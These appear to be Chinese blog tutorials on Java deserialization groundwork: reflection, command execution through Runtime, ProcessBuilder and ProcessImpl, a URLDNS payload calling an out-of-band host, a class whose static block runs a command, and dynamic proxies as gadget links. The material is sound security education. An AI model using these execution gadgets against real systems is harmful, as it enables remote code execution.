= c1.getConstructors();  \n for (Constructor c : constructors1)&#123;  \n            System.out.println(c);  \n &#125;  \n        System.out.println(\"-------分割线---------\");  \n for (Constructor c : constructors2)&#123;  \n            System.out.println(c);  \n &#125;  \n        System.out.println(\"-------分割线---------\");  \n Constructor constructors3 = c1.getConstructor(String.class, int.class);  \n System.out.println(constructors3);  \n System.out.println(\"-------分割线---------\");  \n Constructor constructors4 = c1.getDeclaredConstructor(String.class);  \n &#125;  \n&#125;\n\n\n\n0x05 反射的进阶使用1. 反射创建对象反射创建对象，也叫做反射之后实例化对象，这里用到的是我们之前讲过的 newInstance() 方法\n\n代码\n\nClass c = Class.forName(\"类的名称\"); // 创建Class对象\nObject m1 =  c.newInstance(); // 创建类对象\n\n这里也顺便说下 invoke 方法，invoke 方法位于 java.lang.reflect.Method 类中，用于执行某个的对象的目标方法。一般会和 getMethod 方法配合进行调用。\n用法\npublic Object invoke(Object obj, Object... args)\n\n第一个参数为类的实例，第二个参数为相应函数中的参数\nobj：从中调用底层方法的对象，必须是实例化对象\nargs： 用于方法的调用，是一个 object 的数组，参数有可能是多个\n但需要注意的是，invoke 方法第一个参数并不是固定的：\n如果调用这个方法是普通方法，第一个参数就是类对象；\n如果调用这个方法是静态方法，第一个参数就是类；\n将我们的知识进行整合归纳下，我们可以写个完整的小例子。\npackage src;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class ReflectionTest04 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Class c1 = Class.forName(\"src.Person\");  \n Object m = c1.newInstance();  \n Method method = c1.getMethod(\"reflect\");  \n method.invoke(m);  \n &#125;  \n&#125;\n\n\n\n这就是反射，简单吧。回归到我们上篇文章讲的 URLDNS，我们需要完成这样一些操作。\n0x06 关于反射的小结先讲完反射，再去以 URLDNS 链为例\n说白了反射也就这点东西，先获取类，并进行实例化对象；\n然后获取类里面的属性；调用类里面的方法，就没了。\n0x07 URLDNS 链讲解上节我们半路上杀出了一个程咬金，这里我们把它解决掉。\n要修改 hashCode 先为不是 -1 的值，再改回 -1 其实很简单，我们先获取类，并且实例化对象。我们来看 Payload，其实一下就明白了。\n// 这里不要发起请求  \nURL url = new URL(\"http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com\");  \nClass c = url.getClass();  \nField hashcodefile = c.getDeclaredField(\"hashCode\");  \nhashcodefile.setAccessible(true);  \nhashcodefile.set(url,1234);  \nhashmap.put(url,1);  \n// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  \nhashcodefile.set(url,-1);  \nserialize(hashmap);\n\ngetClass() 实例化对象，接着就是获取类的方法，获取类的属性并修改。\n0x08 利用反射弹计算器用我们的 forName 与 newInstance() 实例化对象后，再进行获取方法，执行。\npackage src.ReflectDemo;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class FinalReflectionCalc &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Class c1 = Class.forName(\"java.lang.Runtime\");  \n Object o1 = c1.newInstance();  \n Method m1 = c1.getDeclaredMethod(\"exec\",String.class);  \n &#125;  \n&#125;\n\n这里报错了，原因是 java.lang.Runtime 是私有的。\n\n\n我们换一种方式弹计算器，不过加上 setAccessible(true) 也可以\npackage src.ReflectDemo;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class FinalReflectionCalc &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n       /* 失败，因为 java.lang.Runtime 是私有的  \n Class c1 = Class.forName(\"java.lang.Runtime\"); Object o1 = c1.newInstance(); Method m1 = c1.getDeclaredMethod(\"exec\",String.class); m1.invoke(o1,\"C:\\\\WINDOWS\\\\System32\\\\calc.exe\"); */  \n Class c1 = Class.forName(\"java.lang.Runtime\");  \n Method method = c1.getMethod(\"exec\", String.class);  \n Method RuntimeMethod = c1.getMethod(\"getRuntime\");  \n Object o1 = RuntimeMethod.invoke(c1);  \n method.invoke(o1, \"C:\\\\WINDOWS\\\\System32\\\\calc.exe\");  \n &#125;  \n&#125;\n\n成功弹出来了。\n\n\n当然，上方的代码太冗长，可以将上方的代码稍微修整一下：\nClass c1 = Class.forName(\"java.lang.Runtime\");  \nc1.getMethod(\"exec\", String.class).invoke(c1.getMethod(\"getRuntime\").invoke(c1), \"C:\\\\WINDOWS\\\\System32\\\\calc.exe\");\n\n\n0x09 小结这篇文章就打算先如此了，因为篇幅过长，再写一篇 Java 反射进阶的。\n对于 Java 反射其实梳理的还可以吧，简单来说，反射可以辅助于反序列化。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化基础篇-03-Java反射进阶","url":"/2022/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-03-Java%E5%8F%8D%E5%B0%84%E8%BF%9B%E9%98%B6/","content":"Java反射进阶\n\nJava反序列化基础篇-03-Java反射进阶0x01 前言前文说到 Java 反射的一些基础知识，这篇讲进阶。\n0x02 反射的进阶知识1. 关于 java.lang.Runtime\n关于 Java 的 Runtime 类，有必要还是说一下。\n\n\n为什么要用这个 Runtime 类？\n\n我们知道 Java 当中很多的 CVE 漏洞，都与反序列化有关，反序列化也与 RCE 有关，而 Runtime 这个类正是用来命令执行的。\n最主要的原因，Runtime 类中有 exec 方法，可以用来命令执行。\n2. 设置 setAccessible(true)暴力访问权限在一般情况下，我们使用反射机制不能对类的私有 private 字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用 AccessibleObject 上的 setAccessible() 方法来允许访问。\n\n这种方法与 getConstructor 配合使用\n\n和 getMethod 类似，getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载，\n所以必须用参数列表类型才能唯一确定一个构造函数。还是以弹计算器为例。\npackage src.ReflectDemo;  \n  \nimport java.lang.reflect.Constructor;  \n  \n// 进阶使用反射  \npublic class FinalReflectionCalc02 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Class c1 = Class.forName(\"java.lang.Runtime\");  \n Constructor m = c1.getDeclaredConstructor();  \n m.setAccessible(true);  \n c1.getMethod(\"exec\", String.class).invoke(m.newInstance(),\"C:\\\\WINDOWS\\\\System32\\\\calc.exe\");  \n &#125;  \n&#125;\n\n3. forName 的两个重载方法的区别对于 Class.forName() 方法，有两个重载方法。\n\n\nforName(String className)\nforName(String name, boolean initialize, ClassLoader loader)\n\n\n第一个参数表示类名\n第二个参数表示是否初始化\n第三个参数表示类加载器，即告诉Java虚拟机如何加载这个类，Java默认的ClassLoader就是根据类名来加载类， 这个类名是类完整路路径，如 java.lang.Runtime\n\n因此，forName(className)等价于forName(className, true, currentLoader)\n4. 各种代码块执行顺序package src.ReflectDemo;  \n  \n// 各种代码块执行顺序  \npublic class FunctionSort &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Test test = new Test();  \n &#125;  \nstatic class Test&#123;  \n    &#123;  \n        System.out.println(\"1\");  \n &#125;  \n    static &#123;  \n        System.out.println(\"2\");  \n &#125;  \n    Test()&#123;  \n        System.out.println(\"3\");  \n &#125;  \n&#125;  \n&#125;\n\n\n\n其实你运⾏⼀下就知道了，⾸先调⽤的是 static &#123;&#125; ，其次是 &#123;&#125; ，最后是构造函数。\n其中， static &#123;&#125; 就是在“类初始化”的时候调⽤的，⽽ &#123;&#125; 中的代码会放在构造函数的 super() 后⾯，但在当前构造函数内容的前⾯。\n所以说， forName 中的 initialize=true 其实就是告诉 Java 虚拟机是否执⾏”类初始化“。\n那么，假设我们有如下函数，其中函数的参数name可控：\npublic void ref(String name) throws Exception &#123;\nClass.forName(name);\n&#125;\n\n我们就可以编写⼀个恶意类，将恶意代码放置在 static &#123;&#125;中，从⽽进行恶意代码的执⾏：\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile &#123;\n\tstatic &#123;\n\t\t\n\t\ttry &#123;\n\t\t\tRuntime rt = Runtime.getRuntime();\n\t\t\tString[] commands = &#123;\"touch\", \"/tmp/success\"&#125;;\n\t\t\tProcess pc = rt.exec(commands);\n\t\t\tpc.waitFor();\n\t\t&#125; catch (Exception e) &#123;\n// do nothing\n\t\t&#125;\n\t&#125;\n&#125;\n\n0x03 Java 命令执行的三种方式还记得最开始讲的反序列化吗？反序列化当中我们需要入口类，需要链子，还需要一个命令执行的方法。\n1. 调用 Runtime 类进行命令执行先挂整个程序，再进行细细分析\npackage src.CommandExec;  \n  \nimport java.io.ByteArrayOutputStream;  \nimport java.io.InputStream;  \n  \n// 使用 Runtime 类进行命令执行  \npublic class RuntimeExec &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        InputStream inputStream = Runtime.getRuntime().exec(\"whoami\").getInputStream();  \n byte[] cache = new byte[1024];  \n ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  \n int readLen = 0;  \n while ((readLen = inputStream.read(cache))!=-1)&#123;  \n            byteArrayOutputStream.write(cache, 0, readLen);  \n &#125;  \n        System.out.println(byteArrayOutputStream);  \n &#125;  \n&#125;\n// laptop-msg46jep\\vanhurts\n\n大致思路：\n\n先调用 getRuntime() 返回一个 Runtime 对象，然后调用 Runtime 对象的 exec 的方法。\n\n调用 Runtime 对象的 exec 的方法会返回 Process 对象，调用 Process 对象的 getInputStream() 方法。\n\n调用 Process 对象的 getInputStream() 方法，此时，子进程已经执行了 whoami 命令作为子进程的输出，将这一段输出作为输入流传入 inputStream\n\n\n\nOK，我们的第一行就是用来执行命令的，但是我们执行命令需要得到命令的结果，所以需要将结果存储到字节数组当中\n\n这一段代码用来保存运行结果\nbyte[] cache = new byte[1024];  \nByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  \n/** \n* readLen用于存储每次读取输入流的长度\n*/\nint readLen = 0;  \nwhile ((readLen = inputStream.read(cache))!=-1)&#123;  \n    byteArrayOutputStream.write(cache, 0, readLen);  \n&#125;\n\n2. ProcessBuilder\nInputStream inputStream = new ProcessBuilder(&quot;whoami)&quot;.start().getInputStream();\n\n只是换了一种命令执行的方式，将内容读取出来的语句不变。\npackage src.CommandExec;  \n  \n  \nimport java.io.ByteArrayOutputStream;  \nimport java.io.InputStream;  \n  \n// 使用 ProcessBuilder 进行命令执行操作  \npublic class ProcessBuilderExec &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        InputStream inputStream = new ProcessBuilder(\"ipconfig\").start().getInputStream();  \n byte[] cache = new byte[1024];  \n int readLen = 0;  \n ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  \n while ((readLen = inputStream.read(cache)) != -1)&#123;  \n            byteArrayOutputStream.write(cache, 0, readLen);  \n &#125;  \n        System.out.println(byteArrayOutputStream);  \n &#125;  \n&#125;\n//laptop-msg46jep\\vanhurts\n\n3. 使用 ProcessImplProcessImpl 是更为底层的实现，Runtime 和 ProcessBuilder 执行命令实际上也是调用了 ProcessImpl 这个类，对于 ProcessImpl 类我们不能直接调用，但是可以通过反射来间接调用 ProcessImpl 来达到执行命令的目的。\n\n因为 ProcessImpl 是私有的方法\n\n\n\npackage src.CommandExec;  \n  \n  \nimport java.io.ByteArrayOutputStream;  \nimport java.io.InputStream;  \nimport java.lang.reflect.Method;  \nimport java.util.Map;  \n  \n// 使用 ProcessImpl 进行命令执行  \npublic class ProcessImplExec &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        String[] cmds = new String[]&#123;\"whoami\"&#125;;  \n Class clazz = Class.forName(\"java.lang.ProcessImpl\");  \n Method method = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class,  \n ProcessBuilder.Redirect[].class, boolean.class);  \n method.setAccessible(true);  \n Process e = (Process) method.invoke(null, cmds, null, \".\", null, true);  \n InputStream inputStream = e.getInputStream();  \n byte[] cache = new byte[1024];  \n int readLen = 0;  \n ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  \n while ((readLen = inputStream.read(cache)) != -1)&#123;  \n            byteArrayOutputStream.write(cache, 0, readLen);  \n &#125;  \n        System.out.println(byteArrayOutputStream);  \n &#125;  \n&#125;\nlaptop-msg46jep\\vanhurts\n\n0x04 Java 反射修改 static final 修饰的字段private这个就不用说了，很简单，getDeclaredField 即可\nPrivatePerson.java\n  \npublic class PrivatePerson &#123;  \n    private StringBuilder name = new StringBuilder(\"Drunkbaby\");  \n  \n    public void printName() &#123;  \n        System.out.println(name);  \n    &#125;  \n&#125;\n\n对应的反射代码 PrivateReflect.java\npublic class PrivateReflect &#123;  \n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException &#123;  \n        Class c = Class.forName(\"src.ReflectDemo.ReflectFixFinal.pojo.PrivatePerson\");  \n        Object m = c.newInstance();  \n        Method PrintMethod = c.getDeclaredMethod(\"printName\");  \n        PrintMethod.invoke(m);  \n        Field nameField = c.getDeclaredField(\"name\");  \n        nameField.setAccessible(true);  \n        nameField.set(m, new StringBuilder(\"Drunkbaby Too Silly\"));  \n        PrintMethod.invoke(m);  \n    &#125;  \n&#125;\n\n\n\nstaticstatic 单独出现的话，getDeclaredField 也是可以的\nStaticPerson.java\npublic class StaticPerson &#123;  \n    private static StringBuilder name = new StringBuilder(\"Drunkbaby\");  \n  \n    public void printInfo() &#123;  \n        System.out.println(name);  \n  \n    &#125;  \n&#125;\n\nStaticReflect.java\npublic class StaticReflect &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Class c = Class.forName(\"src.ReflectDemo.ReflectFixFinal.pojo.StaticPerson\");  \n        Object m = c.newInstance();  \n        Method nameMethod = c.getDeclaredMethod(\"printInfo\");  \n        nameMethod.invoke(m);  \n        Field nameField = c.getDeclaredField(\"name\");  \n        nameField.setAccessible(true);  \n        nameField.set(m,new StringBuilder(\"Drunkbaby static Silly\"));  \n        nameMethod.invoke(m);  \n    &#125;  \n&#125;\n\nfinal刚才使用反射成功修改了 private 修饰的变量, 那么如果是 final 修饰的变量那么还能否使用反射来进行修改呢？这时候就需要分情况了。\nfinal 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。\n直接赋值定义直接赋值的 final 修饰符属性\nFinalStraightPerson.java\npublic class FinalStraightPerson &#123;  \n  \n    private final String name = \"Drunkbaby\";  \n    public final int age = 20-2;  \n  \n    public void printInfo() &#123;  \n        System.out.println(name+\" \"+age);  \n  \n    &#125;  \n&#125;\n\n如果我们直接用反射来修改值，是会报错的\nFinalStraightReflect.java\npublic class FinalStraightReflect &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Class c = Class.forName(\"src.ReflectDemo.ReflectFixFinal.pojo.FinalStraightPerson\");  \n        Object m = c.newInstance();  \n        Method printMethod = c.getDeclaredMethod(\"printInfo\");  \n        printMethod.invoke(m);  \n  \n        Field nameField = c.getDeclaredField(\"name\");  \n        Field ageField = c.getDeclaredField(\"age\");  \n        nameField.setAccessible(true);  \n        ageField.setAccessible(true);  \n        nameField.set(m,\"Drunkbaby as Drun1baby\");  \n        ageField.set(m,\"19\");  \n  \n        printMethod.invoke(m);  \n    &#125;  \n&#125;\n\n\n\n间接赋值InDirectPerson.java\npublic class InDirectPerson &#123;  \n    private final StringBuilder sex = new StringBuilder(\"male\");  \n    // 经过逻辑判断产生的变量赋值  \n public final int age = (null!=null?18:18);  \n    // 通过构造函数进行赋值  \n private final String name;  \n    public InDirectPerson()&#123;  \n        name = \"Drunkbaby\";  \n    &#125;  \n  \n    public void printInfo() &#123;  \n        System.out.println(name+\" \"+age+\" \"+sex);  \n  \n    &#125;  \n&#125;\n\nInDirectReflect.java\npublic class InDirectReflect &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Class c = Class.forName(\"src.ReflectDemo.ReflectFixFinal.pojo.InDirectPerson\");  \n        Object m = c.newInstance();  \n        Method printMethod = c.getDeclaredMethod(\"printInfo\");  \n        printMethod.invoke(m);  \n  \n        Field nameField = c.getDeclaredField(\"name\");  \n        Field ageField = c.getDeclaredField(\"age\");  \n        Field sexField = c.getDeclaredField(\"sex\");  \n        nameField.setAccessible(true);  \n        ageField.setAccessible(true);  \n        sexField.setAccessible(true);  \n        nameField.set(m,\"Drunkbaby Too Silly\");  \n        ageField.set(m,180);  \n        sexField.set(m,new StringBuilder(\"female\"));  \n        printMethod.invoke(m);  \n    &#125;  \n&#125;\n\n成功\n\n\nstatic + final使用 static final 修饰符的 name 属性，并且是间接赋值，直接通过反射修改是不可以的。师傅们可以自行尝试，这里我们需要通过反射, 把 nameField 的 final 修饰符去掉，再赋值。\nStaticFinalPerson.java\npublic class StaticFinalPerson &#123;  \n    static final StringBuilder name = new StringBuilder(\"Drunkbaby\");  \n  \n    public void printInfo() &#123;  \n        System.out.println(name);  \n  \n    &#125;  \n&#125;\n\nStaticFinalReflect.java\npublic class StaticFinalReflect &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Class c = Class.forName(\"src.ReflectDemo.ReflectFixFinal.pojo.StaticFinalPerson\");  \n        Object m = c.newInstance();  \n        Method printMethod = c.getDeclaredMethod(\"printInfo\");  \n        printMethod.invoke(m);  \n  \n        Field nameField = c.getDeclaredField(\"name\");  \n        nameField.setAccessible(true);  \n        Field nameModifyField = nameField.getClass().getDeclaredField(\"modifiers\");  \n        nameModifyField.setAccessible(true);  \n        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  \n        nameField.set(m,new StringBuilder(\"Drunkbaby Too Silly\"));  \n        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  \n        printMethod.invoke(m);  \n    &#125;  \n&#125;\n\n\n\n0x05 小结说实话，感觉自己基础不太牢固吧，还是要努力，反射的东西感觉不多。命令执行的方式给我一种非常灵活的感觉。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化基础篇-04-JDK动态代理","url":"/2022/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-04-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/335236.html\n\n\nJava反序列化基础篇-04-JDK动态代理0x01 Java 的代理模式先说说什么是代理模式，要说代理模式，得从代理说起。下面一张图中的中介，就是我们所说的代理。\n\n1. 静态代理简单理解静态代理\n以租客找中介向房东租房子为例\n\n想要实现租客找中介租房东，在 Java 中就需要4个文件，分别是房源、房东、中介、租客，其中房源应该是接口，其余三项为类。不明白房源为什么是接口的师傅，这与 Java 编程的设计思想有关，我个人也喜欢把它与 c++ 里面的纯虚函数做类比。可以移步至狂神的视频学习一下 静态代理\n\nRent.java：这是一个接口，可以抽象的理解为房源，作为房源，它有一个方法 rent() 为租房\n\nRent.java\npackage src.JdkProxy.StaticProxy;  \n  \n// 租房的接口  \npublic interface Rent &#123;  \n  \n    public void rent();  \n&#125;\n\n\nHost.java：这是一个类，这个类就是房东，作为房东，他需要实现 Rent.java 这一个接口，并且要实现接口的 rent() 方法\n\nHost.java\npackage src.JdkProxy.StaticProxy;  \n  \npublic class Host implements Rent &#123;  \n  \n    public void rent()&#123;  \n        System.out.println(\"房东要出租房子\");  \n &#125;  \n&#125;\n\n\nClient.java：这是一个启动类，这个类其实就是租客，租客的想法也很简单，就是找到中介，然后租房（为什么不直接找房东呢？因为房东通常不想管那么多事，而且房源基本被中介垄断）\n\n因为租客是要去找中介看房的，而不是去找房东看房的，所以我们这里先把 Proxy.java 实现一下，也就是把中介相关的功能先实现一下。\n\nProxy.java：这是一个类，这个类是中介，也就是代理，他需要有房东的房源，然而我们通常不会继承房东，而会将房东作为一个私有的属性 host，我们通过 host.rent() 来实现租房的方法。Proxy.java\n\npackage src.JdkProxy.StaticProxy;  \n  \n// 中介  \npublic class Proxy &#123;  \n  \n    private Host host;  \n  \n public Proxy()&#123;&#125;  \n    public Proxy(Host host)&#123;  \n        this.host = host;  \n &#125;  \n  \n    public void rent()&#123;  \n        host.rent();  \n &#125;  \n&#125;\n\n\nClient.java 租客去找中介看房\npackage src.JdkProxy.StaticProxy;  \n  \n// 启动器  \npublic class Client &#123;  \n    public static void main(String[] args) &#123;  \n        Host host = new Host();  \n Proxy proxy = new Proxy(host);  \n proxy.rent();  \n &#125;  \n&#125;\n\n这样子，基本的看房就完成了 ~\n\n\n\n\n但是，租房这一过程就结束了吗？比不可能啊，因为中介还要收中介费呢\n\n\n有一些行为是中介可以做的，而房东不能做的，比如看房，收中介费等等。所以我们要在 Proxy.java 当中实现这些功能。\n\n改进 Proxy.java\npackage src.JdkProxy.StaticProxy;  \n  \n// 中介  \npublic class Proxy &#123;  \n  \n    private Host host;  \n  \n public Proxy()&#123;&#125;  \n    public Proxy(Host host)&#123;  \n        this.host = host;  \n &#125;  \n  \n    public void rent()&#123;  \n        host.rent();  \n contract();  \n fare();  \n &#125;  \n  \n    // 看房  \n public void seeHouse()&#123;  \n        System.out.println(\"中介带你看房\");  \n &#125;  \n  \n    // 收中介费  \n public void fare()&#123;  \n        System.out.println(\"收中介费\");  \n &#125;  \n  \n    // 签租赁合同  \n public void contract()&#123;  \n        System.out.println(\"签租赁合同\");  \n &#125;  \n&#125;\n\n\n\n优点：\n\n可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .\n公共的业务由代理来完成 . 实现了业务的分工 ,\n公共业务发生扩展时变得更加集中和方便 .\n\n缺点 :\n\n一个真是类对应一个代理角色，代码量翻倍，开发效率降低 .\n\n我们想要静态代理的好处，又不想要静态代理的缺点，所以 , 就有了动态代理 !\n深入理解静态代理深入到实际业务当中，比如我们平常做的最多的 CRUD\n\nUserService.java，这是一个接口，我们定义四个抽象方法。\n\npackage src.JdkProxy.MoreStaticProxy;  \n  \n// 深入理解静态代理  \npublic interface UserService &#123;  \n    public void add();  \n public void delete();  \n public void update();  \n public void query();  \n&#125;\n\n我们需要一个真实对象来完成这些增删改查操作UserServiceImpl.java\npackage src.JdkProxy.MoreStaticProxy;  \n  \npublic class UserServiceImpl implements UserService&#123;  \n  \n    @Override  \n public void add() &#123;  \n        System.out.println(\"增加了一个用户\");  \n &#125;  \n  \n    @Override  \n public void delete() &#123;  \n        System.out.println(\"删除了一个用户\");  \n &#125;  \n  \n    @Override  \n public void update() &#123;  \n        System.out.println(\"更新了一个用户\");  \n &#125;  \n  \n    @Override  \n public void query() &#123;  \n        System.out.println(\"查询了一个用户\");  \n &#125;  \n&#125;\n\n需求来了，现在我们需要增加一个日志功能，怎么实现！\n\n思路1 ：在实现类上增加代码 【麻烦！】\n思路2：使用代理来做，能够不改变原来的业务情况下，实现此功能就是最好的了！\n\n\n处理手段：增加一个代理类来处理日志~\n\nUserServiceProxy.java\npackage src.JdkProxy.MoreStaticProxy;  \n  \n// 代理  \npublic class UserServiceProxy implements UserService&#123;  \n    private UserServiceImpl userService;  \n  \n public void setUserService(UserServiceImpl userService) &#123;  \n        this.userService = userService;  \n &#125;  \n  \n    public void add() &#123;  \n        log(\"add\");  \n userService.add();  \n &#125;  \n  \n    public void delete() &#123;  \n        log(\"delete\");  \n userService.delete();  \n &#125;  \n  \n    public void update() &#123;  \n        log(\"update\");  \n userService.update();  \n &#125;  \n  \n    public void query() &#123;  \n        log(\"query\");  \n userService.query();  \n &#125;  \n  \n    // 增加日志方法  \n public void log(String msg)&#123;  \n        System.out.println(\"[Debug]使用了 \" + msg +\"方法\");  \n &#125;  \n&#125;\n\n修改启动器 Client.java\npackage src.JdkProxy.MoreStaticProxy;  \n  \npublic class Client &#123;  \n    public static void main(String[] args) &#123;  \n        UserServiceImpl userService = new UserServiceImpl();  \n  \n UserServiceProxy proxy = new UserServiceProxy();  \n proxy.setUserService(userService);  \n proxy.add();  \n  \n &#125;  \n&#125;\n\n如此一来，增加业务点的日志便成功了 ~\n\n2. 动态代理\n前文我们说到静态代理的问题，还记得吗？\n\n每多一个房东就需要多一个中介，这显然不符合生活认知（对于租客来说，如果是用静态代理模式，每当想要换一个房东，那就必须要再换一个中介，在开发中，如果有多个中介代码量就更大了）\n动态代理的出现就是为了解决上面静态代理的缺点。\n动态代理的一些基础知识\n下面讲的主要是一些源码的东西吧，不看也可。我是不建议看的，但是为了文章内容的完整性，我还是贴上来吧。\n\n\n动态代理的角色和静态代理的一样。需要一个实体类，一个代理类，一个启动器。\n动态代理的代理类是动态生成的，静态代理的代理类是我们提前写好的。\n\nJDK的动态代理需要了解两个类\n核心 : InvocationHandler 调用处理程序类和 Proxy 代理类\nInvocationHandler：调用处理程序\npublic interface InvocationHandler\n\nInvocationHandler是由代理实例的调用处理程序实现的接口\n每个代理实例都有一个关联的调用处理程序。\nObject invoke(Object proxy, 方法 method, Object[] args)；\n\n当在代理实例上调用方法的时候，方法调用将被编码并分派到其调用处理程序的invoke()方法。\n参数：\n\nproxy – 调用该方法的代理实例\nmethod -所述方法对应于调用代理实例上的接口方法的实例。方法对象的声明类将是该方法声明的接口，它可以是代理类继承该方法的代理接口的超级接口。\nargs -包含的方法调用传递代理实例的参数值的对象的阵列，或null如果接口方法没有参数。原始类型的参数包含在适当的原始包装器类的实例中，例如java.lang.Integer或java.lang.Boolean 。\n\nProxy : 代理\npublic class Proxy extends Object implements Serializable\n\nProxy提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。\n动态代理类 （以下简称为代理类 ）是一个实现在类创建时在运行时指定的接口列表的类，具有如下所述的行为。 代理接口是由代理类实现的接口。 代理实例是代理类的一个实例。\npublic static Object newProxyInstance(ClassLoader loader, 类&lt;?>[] interfaces, InvocationHandler h) throws IllegalArgumentException\n\n返回指定接口的代理类的实例，该接口将方法调用分派给指定的调用处理程序。\n参数\n\nloader – 类加载器来定义代理类\ninterfaces – 代理类实现的接口列表\nh – 调度方法调用的调用处理函数\n\n动态代理的代码实现\n要写动态代理的代码，需要抓牢两个要点\n\n①：我们代理的是接口，而不是单个用户。②：代理类是动态生成的，而非静态定死。\n我只能说这种编程思想是真的牛逼，其实我们还可以实现任意接口的动态代理实现，在这里就不贴出来了。\n首先是我们的接口类UserService.java\npackage src.JdkProxy.DynamicProxy;  \n  \n  \npublic interface UserService &#123;  \n    public void add();  \n public void delete();  \n public void update();  \n public void query();  \n&#125;\n\n接着，我们需要用实体类去实现这个抽象类\nUserServiceImpl.java\npackage src.JdkProxy.DynamicProxy;  \n  \npublic class UserServiceImpl implements UserService&#123;  \n    @Override  \n public void add() &#123;  \n        System.out.println(\"增加了一个用户\");  \n &#125;  \n  \n    @Override  \n public void delete() &#123;  \n        System.out.println(\"删除了一个用户\");  \n &#125;  \n  \n    @Override  \n public void update() &#123;  \n        System.out.println(\"更新了一个用户\");  \n &#125;  \n  \n    @Override  \n public void query() &#123;  \n        System.out.println(\"查询了一个用户\");  \n &#125;  \n&#125;\n\n接着，是动态代理的实现类\npackage src.JdkProxy.DynamicProxy;  \n  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.Method;  \nimport java.lang.reflect.Proxy;  \n  \npublic class UserProxyInvocationHandler implements InvocationHandler &#123;  \n  \n    // 被代理的接口  \n private UserService userService;  \n  \n public void setUserService(UserService userService) &#123;  \n        this.userService = userService;  \n &#125;  \n  \n    // 动态生成代理类实例  \n public Object getProxy()&#123;  \n        Object obj = Proxy.newProxyInstance(this.getClass().getClassLoader(), userService.getClass().getInterfaces(), this);  \n return obj;  \n &#125;  \n  \n    // 处理代理类实例，并返回结果  \n @Override  \n public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;  \n        log(method);  \n Object obj = method.invoke(userService, args);  \n return obj;  \n &#125;  \n  \n    //业务自定义需求  \n public void log(Method method)&#123;  \n        System.out.println(\"[Info] \" + method.getName() + \"方法被调用\");  \n &#125;  \n&#125;\n\n\n最后编写我们的 Client，也就是启动器\n\nClient.java\npackage src.JdkProxy.DynamicProxy;  \n  \nimport src.JdkProxy.DynamicProxy.UserServiceImpl;  \n  \npublic class Client &#123;  \n    public static void main(String[] args) &#123;  \n        // 真实角色  \n UserServiceImpl userServiceImpl = new UserServiceImpl();  \n // 代理角色，不存在  \n UserProxyInvocationHandler userProxyInvocationHandler = new UserProxyInvocationHandler();  \n userProxyInvocationHandler.setUserService((UserService) userServiceImpl); // 设置要代理的对象  \n  \n // 动态生成代理类  \n UserService proxy = (UserService) userProxyInvocationHandler.getProxy();  \n  \n proxy.add();  \n proxy.delete();  \n proxy.update();  \n proxy.query();  \n &#125;  \n&#125;\n\n\n\n\n上述，我们的动态代理便完成了。\n\n0x02 在反序列化中动态代理的作用\n如果只是纯讲开发，没什么意义，我们重点来了，动态代理是如何参与反序列化攻击的。\n\n回到之前文章的内容，我们之前说要利用反序列化的漏洞，我们是需要一个入口类的。\n我们先假设存在一个能够漏洞利用的类为 B.f，比如 Runtime.exec 这种。我们将入口类定义为 A，我们最理想的情况是 A[O] -&gt; O.f，那么我们将传进去的参数 O 替换为 B 即可。但是在实战的情况下这种情况是极少的。\n回到实战情况，比如我们的入口类 A 存在 O.abc 这个方法，也就是 A[O] -&gt; O.abc；而 O 呢，如果是一个动态代理类，O 的 invoke 方法里存在 .f 的方法，便可以漏洞利用了，我们还是展示一下。\nA[O] -> O.abc\nO[O2] invoke -> O2.f // 此时将 B 去替换 O2\n最后  ---->\nO[B] invoke -> B.f // 达到漏洞利用效果\n\n\n动态代理在反序列化当中的利用和 readObject 是异曲同工的。\nreadObject 方法在反序列化当中会被自动执行。而 invoke 方法在动态代理当中会自动执行。\n\n\n0x03 